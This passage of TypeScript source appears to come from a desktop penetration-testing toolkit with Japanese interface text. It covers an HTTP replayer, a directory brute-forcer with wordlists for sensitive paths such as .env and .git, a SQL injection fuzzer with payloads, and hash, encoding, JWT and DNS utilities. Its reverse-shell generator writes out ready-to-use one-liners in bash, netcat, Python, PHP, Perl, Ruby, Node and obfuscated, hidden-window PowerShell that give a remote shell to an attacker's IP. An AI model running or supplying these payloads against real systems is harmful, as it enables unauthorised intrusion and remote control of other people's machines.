  ) as HTMLDivElement | null;
  const respHeadersEl = document.getElementById(
    "hr-resp-headers",
  ) as HTMLPreElement | null;
  const respBodyEl = document.getElementById(
    "hr-resp-body",
  ) as HTMLPreElement | null;
  if (!sendBtn || !urlEl) return;

  rawLoadBtn?.addEventListener("click", () => {
    const text = rawEl?.value || "";
    if (!text) return;
    const lines = text.split(/\r?\n/);
    const reqLine = lines[0]?.match(/^(\S+)\s+(\S+)\s+HTTP/);
    if (!reqLine) {
      alert("リクエスト行が読めません (例: POST /path HTTP/1.1)");
      return;
    }
    const method = reqLine[1];
    let path = reqLine[2];
    let host = "";
    const hdrLines: string[] = [];
    let i = 1;
    for (; i < lines.length; i++) {
      const ln = lines[i];
      if (ln.trim() === "") {
        i++;
        break;
      }
      hdrLines.push(ln);
      const hm = ln.match(/^Host:\s*(.+)$/i);
      if (hm) host = hm[1].trim();
    }
    const body = lines.slice(i).join("\n");
    if (methodEl) methodEl.value = method;
    const scheme = host.includes(":443") ? "https" : "http";
    if (host && urlEl) urlEl.value = `${scheme}://${host}${path}`;
    if (headersEl)
      headersEl.value = hdrLines.filter((l) => !/^host:/i.test(l)).join("\n");
    if (bodyEl) bodyEl.value = body;
  });

  sendBtn.addEventListener("click", async () => {
    const url = urlEl.value.trim();
    if (!url) {
      if (statusEl) statusEl.textContent = "URL を入力";
      return;
    }
    if (statusEl) statusEl.textContent = "送信中…";
    if (respHeadersEl) respHeadersEl.textContent = "";
    if (respBodyEl) respBodyEl.textContent = "";
    try {
      const r = await invoke<HttpReqResultTS>("pentest_http_request", {
        method: methodEl?.value || "GET",
        url,
        headers: parseHeaderLines(headersEl?.value || ""),
        body: bodyEl?.value || null,
        timeoutMs: 15000,
        followRedirects: followEl?.checked ?? true,
      });
      if (statusEl)
        statusEl.textContent = `${r.status} ${r.status_text} • ${r.bytes.toLocaleString()} bytes • ${r.time_ms}ms • ${r.content_type} • → ${r.final_url}`;
      if (respHeadersEl)
        respHeadersEl.textContent = r.headers
          .map(([k, v]) => `${k}: ${v}`)
          .join("\n");
      if (respBodyEl) respBodyEl.textContent = r.body;
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  });
}

const WORDLIST_COMMON = `admin
administrator
api
app
assets
backup
backups
blog
cgi-bin
config
console
dashboard
data
db
debug
dev
download
downloads
env
files
forum
ftp
home
images
img
include
includes
index
info
internal
js
json
lib
log
login
logs
mail
manager
media
old
panel
phpinfo
phpmyadmin
private
public
robots
secret
secure
server-status
setup
shop
site
sites
sql
src
staff
staging
static
stats
status
storage
support
system
templates
temp
test
tmp
tools
upload
uploads
user
users
v1
v2
vendor
web
webadmin
wordpress
wp-admin
wp-content
wp-includes
xml`;

const WORDLIST_DIRB_SMALL = `${WORDLIST_COMMON}
.git
.svn
.env
.htaccess
.htpasswd
.well-known
about
account
accounts
ads
ajax
analytics
archive
asp
aspnet_client
auth
beta
billing
build
cache
calendar
career
cart
catalog
chat
checkout
cms
common
contact
content
controllers
core
crm
css
custom
customer
default
dist
doc
docs
documents
edit
editor
embed
error
errors
events
example
export
external
fonts
graphql
help
host
images2
import
intranet
inventory
invoice
issues
java
jobs
keys
layout
ldap
legacy
library
list
local
location
mailer
maintenance
manage
marketing
member
members
messages
mobile
module
modules
monitoring
news
newsletter
notice
office
oldsite
order
orders
out
page
pages
partner
pay
payment
payments
phpinfo.php
phpunit
pma
plugins
portal
post
posts
preview
profile
profiles
project
projects
proxy
pub
register
report
reports
research
restore
review
reviews
rss
sales
search
security
service
services
shopping
sign
signup
sitemap
sitemap.xml
soap
software
solutions
spider
ssl
stage
store
stories
subscribe
suppliers
survey
sysadmin
team
test1
test2
testing
tickets
training
trash
update
updates
upgrade
v3
videos
view
welcome
widget
wiki`;

let dbAbort = false;

function setupDirBusterSub(): void {
  const baseEl = document.getElementById("db-base") as HTMLInputElement | null;
  const extEl = document.getElementById("db-ext") as HTMLInputElement | null;
  const concEl = document.getElementById("db-conc") as HTMLInputElement | null;
  const wlEl = document.getElementById(
    "db-wordlist",
  ) as HTMLSelectElement | null;
  const wordsEl = document.getElementById(
    "db-words",
  ) as HTMLTextAreaElement | null;
  const excludeEl = document.getElementById(
    "db-exclude",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById("db-run") as HTMLButtonElement | null;
  const stopBtn = document.getElementById(
    "db-stop",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById(
    "db-status",
  ) as HTMLSpanElement | null;
  const outEl = document.getElementById("db-out") as HTMLPreElement | null;
  if (!baseEl || !runBtn || !outEl) return;

  stopBtn?.addEventListener("click", () => {
    dbAbort = true;
  });

  runBtn.addEventListener("click", async () => {
    const base = baseEl.value.trim().replace(/\/+$/, "");
    if (!base) {
      if (statusEl) statusEl.textContent = "ベースURL 必須";
      return;
    }
    let words: string[] = [];
    const wl = wlEl?.value || "common";
    if (wl === "common") words = WORDLIST_COMMON.split(/\n/);
    else if (wl === "dirb-small") words = WORDLIST_DIRB_SMALL.split(/\n/);
    else words = (wordsEl?.value || "").split(/\n/);
    words = [...new Set(words.map((w) => w.trim()).filter(Boolean))];
    const exts = (extEl?.value || "")
      .split(/[,\s]+/)
      .map((e) => e.replace(/^\./, "").trim())
      .filter(Boolean);
    const paths: string[] = [];
    for (const w of words) {
      paths.push(w);
      for (const e of exts) paths.push(`${w}.${e}`);
    }
    const excludeSet = new Set(
      (excludeEl?.value || "404")
        .split(/[,\s]+/)
        .map((s) => parseInt(s))
        .filter((n) => Number.isFinite(n)),
    );
    const concurrency = Math.max(
      1,
      Math.min(30, parseInt(concEl?.value || "10")),
    );
    dbAbort = false;
    outEl.textContent = "";
    let done = 0;
    let found = 0;
    const total = paths.length;
    if (statusEl) statusEl.textContent = `0/${total}`;
    const queue = [...paths];
    async function worker(): Promise<void> {
      while (queue.length > 0 && !dbAbort) {
        const p = queue.shift()!;
        const url = `${base}/${p}`;
        try {
          const r = await invoke<HttpReqResultTS>("pentest_http_request", {
            method: "GET",
            url,
            headers: [],
            body: null,
            timeoutMs: 8000,
            followRedirects: false,
          });
          done++;
          if (!excludeSet.has(r.status)) {
            found++;
            outEl!.textContent += `[${r.status}] ${url}  (${r.bytes}B)\n`;
            outEl!.scrollTop = outEl!.scrollHeight;
          }
        } catch {
          done++;
        }
        if (statusEl) statusEl.textContent = `${done}/${total} (発見 ${found})`;
      }
    }
    const workers: Promise<void>[] = [];
    for (let i = 0; i < concurrency; i++) workers.push(worker());
    await Promise.all(workers);
    if (statusEl)
      statusEl.textContent = dbAbort
        ? `中断 (${done}/${total}, 発見 ${found})`
        : `完了 (${total}, 発見 ${found})`;
  });
}

const SQLI_PAYLOADS = [
  "'",
  '"',
  "' OR '1'='1",
  "' OR '1'='1' --",
  '" OR "1"="1',
  "' OR 1=1 --",
  "') OR ('1'='1",
  "' UNION SELECT NULL --",
  "' AND SLEEP(3) --",
  "1' AND 1=1--",
  "1' AND 1=2--",
  "admin'--",
  "admin'/*",
  "' OR 'a'='a",
];

const SQL_ERROR_PATTERNS = [
  /SQL syntax/i,
  /mysql_fetch/i,
  /You have an error in your SQL syntax/i,
  /Warning.*mysql/i,
  /MySQLSyntaxError/i,
  /PostgreSQL.*ERROR/i,
  /pg_query\(\)/i,
  /SQLite\/JDBCDriver/i,
  /sqlite3.OperationalError/i,
  /Microsoft.*ODBC.*SQL Server/i,
  /Unclosed quotation mark/i,
  /ORA-\d{5}/i,
  /sqlite_error/i,
  /supplied argument is not a valid MySQL/i,
];

function setupSqliSub(): void {
  const urlEl = document.getElementById("sqli-url") as HTMLInputElement | null;
  const methodEl = document.getElementById(
    "sqli-method",
  ) as HTMLSelectElement | null;
  const bodyEl = document.getElementById(
    "sqli-body",
  ) as HTMLTextAreaElement | null;
  const headersEl = document.getElementById(
    "sqli-headers",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById(
    "sqli-run",
  ) as HTMLButtonElement | null;
  const outEl = document.getElementById("sqli-out") as HTMLPreElement | null;
  if (!runBtn || !outEl) return;

  runBtn.addEventListener("click", async () => {
    const baseUrl = urlEl?.value.trim() || "";
    if (!baseUrl) {
      outEl.textContent = "URL 必須";
      return;
    }
    const method = methodEl?.value || "GET";
    const bodyTpl = bodyEl?.value || "";
    const headers = parseHeaderLines(headersEl?.value || "");
    const lines: string[] = [];
    lines.push(`# SQLi テスト: ${method} ${baseUrl}`);
    outEl.textContent = "テスト中…\n";

    // ベースラインリクエスト
    let baseResp: HttpReqResultTS | null = null;
    try {
      baseResp = await invoke<HttpReqResultTS>("pentest_http_request", {
        method,
        url: method === "GET" ? baseUrl : baseUrl,
        headers,
        body: method === "GET" ? null : bodyTpl.replace(/<FUZZ>/g, "x"),
        timeoutMs: 15000,
        followRedirects: false,
      });
      lines.push(
        `[baseline] ${baseResp.status} ${baseResp.status_text} (${baseResp.bytes}B, ${baseResp.time_ms}ms)`,
      );
    } catch (e) {
      lines.push(`[baseline] エラー: ${e}`);
    }

    for (const payload of SQLI_PAYLOADS) {
      let url = baseUrl;
      let body: string | null = null;
      if (method === "GET") {
        if (baseUrl.includes("<FUZZ>"))
          url = baseUrl.replace(/<FUZZ>/g, encodeURIComponent(payload));
        else {
          // 最後のパラメータ値に payload を追加
          url = baseUrl.replace(/=([^&]*)$/, `=${encodeURIComponent(payload)}`);
        }
      } else {
        body = bodyTpl.replace(/<FUZZ>/g, encodeURIComponent(payload));
      }
      try {
        const r = await invoke<HttpReqResultTS>("pentest_http_request", {
          method,
          url,
          headers,
          body,
          timeoutMs: 15000,
          followRedirects: false,
        });
        const flags: string[] = [];
        for (const re of SQL_ERROR_PATTERNS) {
          if (re.test(r.body)) {
            flags.push(`ERR(${re.source.slice(0, 20)})`);
            break;
          }
        }
        if (baseResp && Math.abs(r.bytes - baseResp.bytes) > 200) {
          flags.push(`Δlen=${r.bytes - baseResp.bytes}`);
        }
        if (baseResp && r.status !== baseResp.status) {
          flags.push(`Δstatus=${r.status}`);
        }
        if (r.time_ms > 2500 && payload.toLowerCase().includes("sleep")) {
          flags.push(`SLOW(${r.time_ms}ms)`);
        }
        const tag = flags.length ? ` ⚠️ ${flags.join(" ")}` : "";
        lines.push(
          `${r.status.toString().padStart(3)} ${r.bytes.toString().padStart(6)}B ${r.time_ms.toString().padStart(5)}ms  ${payload}${tag}`,
        );
        outEl.textContent = lines.join("\n");
      } catch (e) {
        lines.push(`ERR ${payload}: ${e}`);
        outEl.textContent = lines.join("\n");
      }
    }
    lines.push(
      "\n# ⚠️ マークがついた行は SQLi の可能性あり。sqlmap で詳細確認推奨",
    );
    outEl.textContent = lines.join("\n");
  });
}

interface HashSig {
  name: string;
  hashcat: string;
  pattern: RegExp;
}

const HASH_SIGNATURES: HashSig[] = [
  { name: "MD5", hashcat: "0", pattern: /^[a-f0-9]{32}$/i },
  { name: "SHA-1", hashcat: "100", pattern: /^[a-f0-9]{40}$/i },
  { name: "SHA-224", hashcat: "1300", pattern: /^[a-f0-9]{56}$/i },
  { name: "SHA-256", hashcat: "1400", pattern: /^[a-f0-9]{64}$/i },
  { name: "SHA-384", hashcat: "10800", pattern: /^[a-f0-9]{96}$/i },
  { name: "SHA-512", hashcat: "1700", pattern: /^[a-f0-9]{128}$/i },
  { name: "NTLM", hashcat: "1000", pattern: /^[a-f0-9]{32}$/i },
  { name: "MySQL323", hashcat: "200", pattern: /^[a-f0-9]{16}$/i },
  { name: "MySQL5", hashcat: "300", pattern: /^\*[A-F0-9]{40}$/i },
  {
    name: "bcrypt",
    hashcat: "3200",
    pattern: /^\$2[abxy]?\$\d+\$[./A-Za-z0-9]{53}$/,
  },
  {
    name: "MD5 crypt ($1$)",
    hashcat: "500",
    pattern: /^\$1\$[^$]{1,8}\$[./A-Za-z0-9]{22}$/,
  },
  {
    name: "SHA-256 crypt ($5$)",
    hashcat: "7400",
    pattern: /^\$5\$[^$]{1,16}\$[./A-Za-z0-9]{43}$/,
  },
  {
    name: "SHA-512 crypt ($6$)",
    hashcat: "1800",
    pattern: /^\$6\$[^$]{1,16}\$[./A-Za-z0-9]{86}$/,
  },
  {
    name: "Apache APR1 ($apr1$)",
    hashcat: "1600",
    pattern: /^\$apr1\$[^$]{1,8}\$[./A-Za-z0-9]{22}$/,
  },
  { name: "Argon2", hashcat: "—", pattern: /^\$argon2(id|i|d)\$/ },
  { name: "PBKDF2-SHA256", hashcat: "10900", pattern: /^pbkdf2_sha256\$/ },
  { name: "Django PBKDF2", hashcat: "10000", pattern: /^pbkdf2_sha\d+\$\d+\$/ },
  { name: "phpBB3 ($H$)", hashcat: "400", pattern: /^\$H\$[./A-Za-z0-9]{31}$/ },
  {
    name: "WordPress ($P$)",
    hashcat: "400",
    pattern: /^\$P\$[./A-Za-z0-9]{31}$/,
  },
  {
    name: "JWT",
    hashcat: "16500",
    pattern: /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/,
  },
  { name: "CRC32", hashcat: "11500", pattern: /^[a-f0-9]{8}$/i },
  { name: "LM", hashcat: "3000", pattern: /^[a-f0-9]{32}$/i },
];

function setupHashIdSub(): void {
  const inEl = document.getElementById("hi-input") as HTMLInputElement | null;
  const runBtn = document.getElementById("hi-run") as HTMLButtonElement | null;
  const outEl = document.getElementById("hi-out") as HTMLDivElement | null;
  if (!runBtn || !outEl) return;
  function detect(): void {
    const v = (inEl?.value || "").trim();
    if (!v) {
      outEl!.innerHTML = "";
      return;
    }
    const matches = HASH_SIGNATURES.filter((s) => s.pattern.test(v));
    if (matches.length === 0) {
      outEl!.innerHTML = `<span style="color:#cf222e">未知のハッシュ形式 (長さ: ${v.length})</span>`;
      return;
    }
    outEl!.innerHTML = matches
      .map(
        (m) =>
          `<div style="padding:4px 8px;border:1px solid #ddd;border-radius:4px;margin-bottom:4px;background:#fff"><strong>${escapeHtml(m.name)}</strong> <code style="color:#666">hashcat -m ${m.hashcat}</code> &nbsp; <code style="color:#666">john --format=${m.name.toLowerCase().replace(/\s.*/, "")}</code></div>`,
      )
      .join("");
  }
  runBtn.addEventListener("click", detect);
  inEl?.addEventListener("input", detect);
}

async function digestHex(algo: string, text: string): Promise<string> {
  const buf = new TextEncoder().encode(text);
  const out = await crypto.subtle.digest(algo, buf);
  return [...new Uint8Array(out)]
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

function md5(text: string): string {
  // 簡易 MD5 実装 (RFC1321)
  function add32(a: number, b: number): number {
    return (a + b) & 0xffffffff;
  }
  function rol(n: number, c: number): number {
    return (n << c) | (n >>> (32 - c));
  }
  function cmn(
    q: number,
    a: number,
    b: number,
    x: number,
    s: number,
    t: number,
  ): number {
    a = add32(add32(a, q), add32(x, t));
    return add32(rol(a, s), b);
  }
  function ff(
    a: number,
    b: number,
    c: number,
    d: number,
    x: number,
    s: number,
    t: number,
  ): number {
    return cmn((b & c) | (~b & d), a, b, x, s, t);
  }
  function gg(
    a: number,
    b: number,
    c: number,
    d: number,
    x: number,
    s: number,
    t: number,
  ): number {
    return cmn((b & d) | (c & ~d), a, b, x, s, t);
  }
  function hh(
    a: number,
    b: number,
    c: number,
    d: number,
    x: number,
    s: number,
    t: number,
  ): number {
    return cmn(b ^ c ^ d, a, b, x, s, t);
  }
  function ii(
    a: number,
    b: number,
    c: number,
    d: number,
    x: number,
    s: number,
    t: number,
  ): number {
    return cmn(c ^ (b | ~d), a, b, x, s, t);
  }
  const bytes: number[] = [];
  const enc = new TextEncoder().encode(text);
  for (const b of enc) bytes.push(b);
  const len = bytes.length * 8;
  bytes.push(0x80);
  while (bytes.length % 64 !== 56) bytes.push(0);
  for (let i = 0; i < 8; i++) bytes.push((len >>> (8 * i)) & 0xff);
  let a = 0x67452301,
    b = 0xefcdab89,
    c = 0x98badcfe,
    d = 0x10325476;
  for (let i = 0; i < bytes.length; i += 64) {
    const x: number[] = new Array(16);
    for (let j = 0; j < 16; j++) {
      x[j] =
        bytes[i + j * 4] |
        (bytes[i + j * 4 + 1] << 8) |
        (bytes[i + j * 4 + 2] << 16) |
        (bytes[i + j * 4 + 3] << 24);
    }
    const aa = a,
      bb = b,
      cc = c,
      dd = d;
    a = ff(a, b, c, d, x[0], 7, -680876936);
    d = ff(d, a, b, c, x[1], 12, -389564586);
    c = ff(c, d, a, b, x[2], 17, 606105819);
    b = ff(b, c, d, a, x[3], 22, -1044525330);
    a = ff(a, b, c, d, x[4], 7, -176418897);
    d = ff(d, a, b, c, x[5], 12, 1200080426);
    c = ff(c, d, a, b, x[6], 17, -1473231341);
    b = ff(b, c, d, a, x[7], 22, -45705983);
    a = ff(a, b, c, d, x[8], 7, 1770035416);
    d = ff(d, a, b, c, x[9], 12, -1958414417);
    c = ff(c, d, a, b, x[10], 17, -42063);
    b = ff(b, c, d, a, x[11], 22, -1990404162);
    a = ff(a, b, c, d, x[12], 7, 1804603682);
    d = ff(d, a, b, c, x[13], 12, -40341101);
    c = ff(c, d, a, b, x[14], 17, -1502002290);
    b = ff(b, c, d, a, x[15], 22, 1236535329);
    a = gg(a, b, c, d, x[1], 5, -165796510);
    d = gg(d, a, b, c, x[6], 9, -1069501632);
    c = gg(c, d, a, b, x[11], 14, 643717713);
    b = gg(b, c, d, a, x[0], 20, -373897302);
    a = gg(a, b, c, d, x[5], 5, -701558691);
    d = gg(d, a, b, c, x[10], 9, 38016083);
    c = gg(c, d, a, b, x[15], 14, -660478335);
    b = gg(b, c, d, a, x[4], 20, -405537848);
    a = gg(a, b, c, d, x[9], 5, 568446438);
    d = gg(d, a, b, c, x[14], 9, -1019803690);
    c = gg(c, d, a, b, x[3], 14, -187363961);
    b = gg(b, c, d, a, x[8], 20, 1163531501);
    a = gg(a, b, c, d, x[13], 5, -1444681467);
    d = gg(d, a, b, c, x[2], 9, -51403784);
    c = gg(c, d, a, b, x[7], 14, 1735328473);
    b = gg(b, c, d, a, x[12], 20, -1926607734);
    a = hh(a, b, c, d, x[5], 4, -378558);
    d = hh(d, a, b, c, x[8], 11, -2022574463);
    c = hh(c, d, a, b, x[11], 16, 1839030562);
    b = hh(b, c, d, a, x[14], 23, -35309556);
    a = hh(a, b, c, d, x[1], 4, -1530992060);
    d = hh(d, a, b, c, x[4], 11, 1272893353);
    c = hh(c, d, a, b, x[7], 16, -155497632);
    b = hh(b, c, d, a, x[10], 23, -1094730640);
    a = hh(a, b, c, d, x[13], 4, 681279174);
    d = hh(d, a, b, c, x[0], 11, -358537222);
    c = hh(c, d, a, b, x[3], 16, -722521979);
    b = hh(b, c, d, a, x[6], 23, 76029189);
    a = hh(a, b, c, d, x[9], 4, -640364487);
    d = hh(d, a, b, c, x[12], 11, -421815835);
    c = hh(c, d, a, b, x[15], 16, 530742520);
    b = hh(b, c, d, a, x[2], 23, -995338651);
    a = ii(a, b, c, d, x[0], 6, -198630844);
    d = ii(d, a, b, c, x[7], 10, 1126891415);
    c = ii(c, d, a, b, x[14], 15, -1416354905);
    b = ii(b, c, d, a, x[5], 21, -57434055);
    a = ii(a, b, c, d, x[12], 6, 1700485571);
    d = ii(d, a, b, c, x[3], 10, -1894986606);
    c = ii(c, d, a, b, x[10], 15, -1051523);
    b = ii(b, c, d, a, x[1], 21, -2054922799);
    a = ii(a, b, c, d, x[8], 6, 1873313359);
    d = ii(d, a, b, c, x[15], 10, -30611744);
    c = ii(c, d, a, b, x[6], 15, -1560198380);
    b = ii(b, c, d, a, x[13], 21, 1309151649);
    a = ii(a, b, c, d, x[4], 6, -145523070);
    d = ii(d, a, b, c, x[11], 10, -1120210379);
    c = ii(c, d, a, b, x[2], 15, 718787259);
    b = ii(b, c, d, a, x[9], 21, -343485551);
    a = add32(a, aa);
    b = add32(b, bb);
    c = add32(c, cc);
    d = add32(d, dd);
  }
  function hex(n: number): string {
    let s = "";
    for (let i = 0; i < 4; i++)
      s += ((n >>> (i * 8)) & 0xff).toString(16).padStart(2, "0");
    return s;
  }
  return hex(a) + hex(b) + hex(c) + hex(d);
}

function setupHashGenSub(): void {
  const inEl = document.getElementById(
    "hg-input",
  ) as HTMLTextAreaElement | null;
  const runBtn = document.getElementById("hg-run") as HTMLButtonElement | null;
  const outEl = document.getElementById("hg-out") as HTMLPreElement | null;
  if (!runBtn || !outEl) return;
  runBtn.addEventListener("click", async () => {
    const text = inEl?.value || "";
    const lines: string[] = [];
    lines.push(`MD5     : ${md5(text)}`);
    lines.push(`SHA-1   : ${await digestHex("SHA-1", text)}`);
    lines.push(`SHA-256 : ${await digestHex("SHA-256", text)}`);
    lines.push(`SHA-384 : ${await digestHex("SHA-384", text)}`);
    lines.push(`SHA-512 : ${await digestHex("SHA-512", text)}`);
    lines.push(`Base64  : ${btoa(unescape(encodeURIComponent(text)))}`);
    lines.push(`URL enc : ${encodeURIComponent(text)}`);
    outEl.textContent = lines.join("\n");
  });
}

function setupEncodeSub(): void {
  const modeEl = document.getElementById(
    "enc-mode",
  ) as HTMLSelectElement | null;
  const runBtn = document.getElementById("enc-run") as HTMLButtonElement | null;
  const inEl = document.getElementById(
    "enc-input",
  ) as HTMLTextAreaElement | null;
  const outEl = document.getElementById(
    "enc-output",
  ) as HTMLTextAreaElement | null;
  if (!runBtn || !inEl || !outEl) return;
  runBtn.addEventListener("click", () => {
    const text = inEl.value;
    const mode = modeEl?.value || "b64e";
    try {
      let r = "";
      if (mode === "b64e") r = btoa(unescape(encodeURIComponent(text)));
      else if (mode === "b64d") r = decodeURIComponent(escape(atob(text)));
      else if (mode === "urle") r = encodeURIComponent(text);
      else if (mode === "urld") r = decodeURIComponent(text);
      else if (mode === "htme")
        r = text.replace(
          /[&<>"']/g,
          (c) =>
            ({
              "&": "&amp;",
              "<": "&lt;",
              ">": "&gt;",
              '"': "&quot;",
              "'": "&#39;",
            })[c]!,
        );
      else if (mode === "htmd")
        r = text.replace(
          /&(amp|lt|gt|quot|#39|nbsp);/g,
          (_m, e) =>
            ({ amp: "&", lt: "<", gt: ">", quot: '"', "#39": "'", nbsp: " " })[
              e as string
            ] || _m,
        );
      else if (mode === "hexe")
        r = [...new TextEncoder().encode(text)]
          .map((b) => b.toString(16).padStart(2, "0"))
          .join("");
      else if (mode === "hexd") {
        const cleaned = text.replace(/[^a-fA-F0-9]/g, "");
        const bytes = new Uint8Array(cleaned.length / 2);
        for (let i = 0; i < bytes.length; i++)
          bytes[i] = parseInt(cleaned.substr(i * 2, 2), 16);
        r = new TextDecoder().decode(bytes);
      } else if (mode === "rot13")
        r = text.replace(/[a-zA-Z]/g, (c) => {
          const a = c <= "Z" ? 65 : 97;
          return String.fromCharCode(((c.charCodeAt(0) - a + 13) % 26) + a);
        });
      outEl.value = r;
    } catch (e) {
      outEl.value = `エラー: ${e}`;
    }
  });
}

function setupRevShellSub(): void {
  const hostEl = document.getElementById("rs-host") as HTMLInputElement | null;
  const portEl = document.getElementById("rs-port") as HTMLInputElement | null;
  const shellEl = document.getElementById(
    "rs-shell",
  ) as HTMLSelectElement | null;
  const outEl = document.getElementById("rs-out") as HTMLPreElement | null;
  if (!hostEl || !outEl) return;
  function gen(): void {
    const ip = hostEl!.value || "10.10.14.1";
    const port = portEl?.value || "4444";
    const sh = shellEl?.value || "/bin/bash";
    const b64 = btoa(`bash -i >& /dev/tcp/${ip}/${port} 0>&1`);
    const psB64 = btoa(
      `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
        .split("")
        .map((c) => c + "\0")
        .join(""),
    );
    const lines = [
      `# === リスナー ===`,
      `nc -lvnp ${port}`,
      `rlwrap nc -lvnp ${port}    # 矢印キー使える版`,
      ``,
      `# === bash ===`,
      `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
      `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
      `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`,
      `# Base64 で難読化:`,
      `echo ${b64} | base64 -d | bash`,
      ``,
      `# === sh / nc ===`,
      `sh -i 5<> /dev/tcp/${ip}/${port} 0<&5 1>&5 2>&5`,
      `mkfifo /tmp/f; cat /tmp/f|${sh} -i 2>&1|nc ${ip} ${port} >/tmp/f`,
      `nc ${ip} ${port} -e ${sh}                # 古い nc`,
      `nc -c ${sh} ${ip} ${port}                # OpenBSD nc`,
      ``,
      `# === Python ===`,
      `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${sh}","-i"])'`,
      `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${sh}","-i"])'`,
      ``,
      `# === PHP ===`,
      `php -r '$sock=fsockopen("${ip}",${port});exec("${sh} -i <&3 >&3 2>&3");'`,
      `php -r '$s=fsockopen("${ip}",${port});shell_exec("${sh} -i <&3 >&3 2>&3");'`,
      ``,
      `# === Perl ===`,
      `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${sh} -i");};'`,
      ``,
      `# === Ruby ===`,
      `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
      ``,
      `# === Node.js ===`,
      `node -e 'require("child_process").exec("nc -e ${sh} ${ip} ${port}")'`,
      ``,
      `# === PowerShell (Windows) ===`,
      `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
      `# Base64 (-EncodedCommand 用):`,
      `powershell -nop -w hidden -e ${psB64}`,
      ``,
      `# === Java ===`,
      `r = Runtime.getRuntime(); p = r.exec(["${sh}","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor();`,
      ``,
      `# === シェル安定化 (接続後 victim 側で実行) ===`,
      `python3 -c 'import pty;pty.spawn("${sh}")'`,
      `export TERM=xterm-256color`,
      `Ctrl+Z   stty raw -echo;fg   reset`,
    ];
    outEl!.textContent = lines.join("\n");
  }
  hostEl.addEventListener("input", gen);
  portEl?.addEventListener("input", gen);
  shellEl?.addEventListener("change", gen);
  gen();
}

function setupJwtSub(): void {
  const inEl = document.getElementById(
    "jwt-input",
  ) as HTMLTextAreaElement | null;
  const runBtn = document.getElementById("jwt-run") as HTMLButtonElement | null;
  const hEl = document.getElementById("jwt-header") as HTMLPreElement | null;
  const pEl = document.getElementById("jwt-payload") as HTMLPreElement | null;
  const sEl = document.getElementById("jwt-sig") as HTMLPreElement | null;
  if (!runBtn || !inEl) return;
  function b64urlDecode(s: string): string {
    s = s.replace(/-/g, "+").replace(/_/g, "/");
    while (s.length % 4) s += "=";
    try {
      return decodeURIComponent(escape(atob(s)));
    } catch {
      return atob(s);
    }
  }
  function go(): void {
    const t = inEl!.value.trim();
    const parts = t.split(".");
    if (parts.length < 2) {
      if (hEl) hEl.textContent = "形式が JWT ではありません";
      if (pEl) pEl.textContent = "";
      if (sEl) sEl.textContent = "";
      return;
    }
    try {
      const h = JSON.parse(b64urlDecode(parts[0]));
      const p = JSON.parse(b64urlDecode(parts[1]));
      if (hEl) hEl.textContent = JSON.stringify(h, null, 2);
      if (pEl) pEl.textContent = JSON.stringify(p, null, 2);
      if (sEl) sEl.textContent = parts[2] || "(なし)";
    } catch (e) {
      if (hEl) hEl.textContent = `デコード失敗: ${e}`;
    }
  }
  runBtn.addEventListener("click", go);
  inEl.addEventListener("input", go);
}

function setupDnsSub(): void {
  const hostEl = document.getElementById("dns-host") as HTMLInputElement | null;
  const typeEl = document.getElementById(
    "dns-type",
  ) as HTMLSelectElement | null;
  const runBtn = document.getElementById("dns-run") as HTMLButtonElement | null;
  const outEl = document.getElementById("dns-out") as HTMLPreElement | null;
  if (!runBtn || !outEl) return;
  runBtn.addEventListener("click", async () => {
    const name = (hostEl?.value || "").trim();
    if (!name) {
      outEl.textContent = "ホスト名を入力";
      return;
    }
    const type = typeEl?.value || "A";
    outEl.textContent = "クエリ中…";
    try {
      const url = `https://dns.google/resolve?name=${encodeURIComponent(name)}&type=${type}`;
      const r = await invoke<HttpReqResultTS>("pentest_http_request", {
        method: "GET",
        url,
        headers: [["Accept", "application/dns-json"]],
        body: null,
        timeoutMs: 10000,
        followRedirects: true,
      });
      const data = JSON.parse(r.body);
      const lines: string[] = [];
      lines.push(`Query: ${name} (${type})`);
      lines.push(`Status: ${data.Status} (0=NOERROR)`);
      if (data.Answer) {
        lines.push("─ Answer ─");
        for (const a of data.Answer) {
          lines.push(`  ${a.name}\t${a.TTL}\t${typeName(a.type)}\t${a.data}`);
        }
      }
      if (data.Authority) {
        lines.push("─ Authority ─");
